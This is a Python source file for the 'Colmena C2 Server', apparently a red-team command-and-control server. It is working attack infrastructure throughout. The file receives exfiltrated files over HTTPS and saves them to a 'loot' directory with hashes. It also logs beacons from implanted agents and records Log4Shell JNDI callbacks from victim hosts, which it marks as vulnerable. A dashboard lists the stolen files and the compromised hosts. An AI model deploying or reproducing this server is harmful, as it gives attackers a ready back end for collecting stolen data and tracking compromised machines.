#!/usr/bin/env python3
"""
Colmena C2 Server - Receives exfiltrated data and agent beacons.
Real HTTPS endpoint with TLS (self-signed or provided cert).

Usage:
    python3 c2_server.py [--port 8443] [--cert server.crt] [--key server.key]
    python3 c2_server.py --port 8080  # plain HTTP for lab

Endpoints:
    POST /collect     - Receive exfiltrated files
    POST /beacon      - Receive agent heartbeat/status
    GET  /health      - Health check
    GET  /logs        - View received data summary
"""

import argparse
import json
import os
import ssl
import sys
import hashlib
import time
from datetime import datetime
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ── Data Store ────────────────────────────────────────────────────────────────

LOOT_DIR = Path("./loot")
LOOT_DIR.mkdir(exist_ok=True)

BEACONS = []
EXFIL_LOG = []


def save_loot(filename, data, agent_info=None):
    """Save exfiltrated data to disk."""
    safe_name = filename.replace("/", "_").replace("\\", "_")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = LOOT_DIR / f"{ts}_{safe_name}"

    with open(filepath, 'wb') as f:
        f.write(data)

    entry = {
        'timestamp': datetime.now().isoformat(),
        'filename': filename,
        'size': len(data),
        'sha256': hashlib.sha256(data).hexdigest(),
        'path': str(filepath),
        'agent': agent_info,
    }
    EXFIL_LOG.append(entry)

    # Keep log file
    with open(LOOT_DIR / "exfil_log.json", 'w') as f:
        json.dump(EXFIL_LOG, f, indent=2)

    return entry


# ── HTTP Handler ──────────────────────────────────────────────────────────────

API_KEY = os.environ.get("COLMENA_API_KEY", "")

class C2Handler(BaseHTTPRequestHandler):
    """Handle C2 traffic from colmena agents."""

    def log_message(self, format, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")

    def _check_auth(self):
        """Verify API key if configured."""
        if not API_KEY:
            return True
        auth = self.headers.get('Authorization', '')
        return auth == f"Bearer {API_KEY}" or auth == API_KEY

    def _respond_json(self, code, data):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())

    def do_POST(self):
        if API_KEY and not self._check_auth():
            self._respond_json(401, {'error': 'unauthorized', 'hint': 'Use Authorization: Bearer <api_key>'})
            return

        parsed = urlparse(self.path)
        content_len = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_len) if content_len else b''

        agent_id = self.headers.get('X-Agent-ID', 'unknown')
        agent_role = self.headers.get('X-Agent-Role', 'unknown')

        if parsed.path == '/collect':
            filename = self.headers.get('X-File-Name', 'data.bin')

            # Handle base64 encoded body
            if self.headers.get('Content-Transfer-Encoding') == 'base64' or self._is_base64(body):
                import base64
                try:
                    body = base64.b64decode(body)
                except Exception:
                    pass

            entry = save_loot(filename, body, {
                'agent_id': agent_id,
                'agent_role': agent_role,
            })

            self._respond_json(200, {
                'status': 'received',
                'sha256': entry['sha256'],
                'size': entry['size'],
            })
            print(f"  EXFIL: {filename} ({len(body)} bytes) from {agent_role}:{agent_id[:8]}")

        elif parsed.path == '/beacon':
            beacon_data = {}
            try:
                beacon_data = json.loads(body)
            except Exception:
                beacon_data = {'raw': body.hex()}

            beacon_data['timestamp'] = datetime.now().isoformat()
            beacon_data['agent_id'] = agent_id
            beacon_data['agent_role'] = agent_role
            beacon_data['remote_ip'] = self.client_address[0]
            BEACONS.append(beacon_data)

            # Keep last 100 beacons
            if len(BEACONS) > 100:
                BEACONS.pop(0)

            self._respond_json(200, {
                'status': 'ack',
                'beacon_count': len(BEACONS),
            })
            print(f"  BEACON: {agent_role}:{agent_id[:8]} from {self.client_address[0]}")

        elif parsed.path == '/jndi':
            # Log4Shell callback endpoint (LDAP/JNDI)
            victim_ip = self.client_address[0]
            victim_host = self.headers.get('X-Victim-Host', victim_ip)
            callback_data = {
                'timestamp': datetime.now().isoformat(),
                'victim_ip': victim_ip,
                'victim_host': victim_host,
                'method': 'log4shell_jndi',
                'raw_query': parsed.query,
            }
            BEACONS.append(callback_data)
            print(f"  LOG4SHELL CALLBACK: {victim_host} ({victim_ip}) - VULNERABLE!")
            self._respond_json(200, {'status': 'logged', 'callback': 'received'})

        else:
            self._respond_json(404, {'error': 'unknown endpoint'})

    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == '/health':
            self._respond_json(200, {
                'status': 'ok',
                'exfil_count': len(EXFIL_LOG),
                'beacon_count': len(BEACONS),
                'uptime': time.time(),
            })

        elif parsed.path == '/logs':
            self._respond_json(200, {
                'exfiltrations': EXFIL_LOG[-50:],
                'beacons': BEACONS[-50:],
            })

        elif parsed.path == '/':
            self._serve_dashboard()

        else:
            self._respond_json(404, {'error': 'not found'})

    def _respond_json(self, code, data):
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())

    def _serve_dashboard(self):
        html = f'''<!DOCTYPE html>
<html><head><title>Colmena C2</title>
<style>
body{{background:#0a0e14;color:#bfc7d5;font-family:monospace;padding:20px}}
h1{{color:#73d0a0}}h2{{color:#5ccfe6}}
.card{{background:#131821;border:1px solid #1e2a3a;border-radius:6px;padding:12px;margin:8px 0}}
table{{width:100%;border-collapse:collapse}}th,td{{padding:4px 8px;text-align:left;border-bottom:1px solid #1e2a3a}}
th{{color:#5c6773}} .green{{color:#73d0a0}} .red{{color:#f07178}}
</style></head><body>
<h1>COLMENA C2 SERVER</h1>
<p>Exfiltrated: {len(EXFIL_LOG)} files | Beacons: {len(BEACONS)}</p>

<h2>Recent Exfiltrations</h2>
<table><tr><th>Time</th><th>File</th><th>Size</th><th>SHA256</th></tr>
{''.join(f"<tr><td>{e['timestamp'][:19]}</td><td>{e['filename']}</td><td>{e['size']}</td><td style='font-size:10px'>{e['sha256'][:16]}</td></tr>" for e in EXFIL_LOG[-20:])}
</table>

<h2>Recent Beacons</h2>
<table><tr><th>Time</th><th>Agent</th><th>IP</th><th>Data</th></tr>
{''.join(f"<tr><td>{b.get('timestamp','?')[:19]}</td><td>{b.get('agent_role','?')}:{b.get('agent_id','?')[:8]}</td><td>{b.get('remote_ip','?')}</td><td style='font-size:10px'>{json.dumps({k:v for k,v in b.items() if k not in ('timestamp','agent_id','agent_role','remote_ip')})[:100]}</td></tr>" for b in BEACONS[-20:])}
</table>

<p style="color:#5c6773;font-size:10px;margin-top:20px">Refresh to update</p>
</body></html>'''
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def _is_base64(self, data):
        try:
            import base64
            if len(data) < 4:
                return False
            base64.b64decode(data[:min(100, len(data))])
            return True
        except Exception:
            return False


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description='Colmena C2 Server')
    parser.add_argument('--port', type=int, default=8443, help='Listen port')
    parser.add_argument('--host', type=str, default='0.0.0.0', help='Bind address')
    parser.add_argument('--cert', type=str, help='TLS certificate (PEM)')
    parser.add_argument('--key', type=str, help='TLS private key (PEM)')
    parser.add_argument('--no-tls', action='store_true', help='Disable TLS (plain HTTP)')
    args = parser.parse_args()

    server = HTTPServer((args.host, args.port), C2Handler)

    protocol = 'https' if not args.no_tls else 'http'
    if not args.no_tls:
        if args.cert and args.key:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(args.cert, args.key)
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
            print(f'C2 Server: {protocol}://{args.host}:{args.port} (TLS from {args.cert})')
        else:
            # Generate self-signed cert
            try:
                import tempfile
                import subprocess
                with tempfile.NamedTemporaryFile(suffix='.pem', delete=False) as f:
                    subprocess.run([
                        'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                        '-keyout', f.name, '-out', f.name,
                        '-days', '365', '-nodes',
                        '-subj', '/CN=ColmenaC2/O=Colmena/OU=RedTeam'
                    ], capture_output=True, check=True)
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                    ctx.load_cert_chain(f.name, f.name)
                    server.socket = ctx.wrap_socket(server.socket, server_side=True)
                    print(f'C2 Server: {protocol}://{args.host}:{args.port} (self-signed TLS)')
                    os.unlink(f.name)
            except Exception:
                print(f'C2 Server: http://{args.host}:{args.port} (TLS failed, using plain HTTP)')
                args.no_tls = True
    else:
        print(f'C2 Server: http://{args.host}:{args.port} (plain HTTP)')

    print(f'Endpoints:')
    print(f'  POST /collect  - Receive exfiltrated files')
    print(f'  POST /beacon   - Receive agent beacons')
    print(f'  GET  /health   - Health check')
    print(f'  GET  /         - Dashboard')
    print(f'Loot directory: {LOOT_DIR.absolute()}')
    print(f'Press Ctrl+C to stop')

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\nShutting down...')
        server.shutdown()


if __name__ == '__main__':
    main()
